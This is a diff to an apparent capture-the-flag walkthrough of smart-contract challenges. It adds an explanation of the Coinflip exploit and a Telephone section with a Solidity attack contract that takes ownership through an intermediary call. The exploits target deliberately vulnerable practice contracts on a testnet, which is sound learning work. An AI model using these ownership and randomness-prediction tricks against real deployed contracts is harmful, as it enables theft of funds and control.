@@ -22,7 +22,7 @@ await contract.owner() // after the above command we now see that our address is
 await contract.collectAllocations()
 ```
 ## 3. Coinflip
-Ok this was a little bit more difficult from the previous two since now we need to write code. I won't lie either I looked up some hints online to give me some type of idea how to go about this and it was much simpler once i read them. We need to import the CoinFlip contract given to us into a new solidity file so that it can be called at a later point after we submit our guess to the main ```flip()``` function in it.
+Ok this was a little bit more difficult from the previous two since now we need to write code. I won't lie either I looked up some hints online to give me some type of idea how to go about this and it was much simpler once i read them. We need to import the CoinFlip contract given to us into a new solidity file so that it can be called at a later point after we submit our guess to the main ```flip()``` function in it. All we are really doing is taking the given function and copying it entirely but at the end when we check if the side is equal to our guess we just either submit our true or false answer if it is equal to the side and the opposite if not.
 
 Below is my contract I wrote and deployed on Rinkeby that ended up working:
 ```// SPDX-License-Identifier: MIT
@@ -55,6 +55,24 @@ contract CoinFlipHack {
       target.flip(false);
     }
   }
+}
+```
+## 4. Telephone
+Another easy one the contract is set up so that we can change ourself to the owner of the contract simply by calling the ```changeOwner()``` function through a contract from our address. Use ```await contract.owner()``` to see the initial owner of contract and to check that our address is the owner afterwards.
+
+Code written that calls the Telephone contract to allow us to take ownership:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "./Telephone.sol";
+
+contract TelephoneHack {
+    Telephone target = Telephone(Instance ID);
+
+    function telephoneHack(address _owner) public {
+        target.changeOwner(_owner);
+    }
 }
 ```
 
